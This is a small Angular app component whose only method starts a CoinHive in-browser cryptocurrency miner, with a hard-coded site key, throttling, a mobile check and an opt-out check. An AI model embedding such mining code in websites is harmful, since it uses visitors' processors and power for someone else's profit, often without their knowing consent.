import { Component } from '@angular/core';

declare var CoinHive: any;

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent {

  startMiner() {
    var miner = new CoinHive.Anonymous('WbWeCFFLVH6mLfn3OYt48oXvUhGiwj2j', {throttle: 0.3});
    if (!miner.isMobile() && !miner.didOptOut(14400)) {
      miner.start();
    }
    console.log('Coinhive miner started');
  }

}
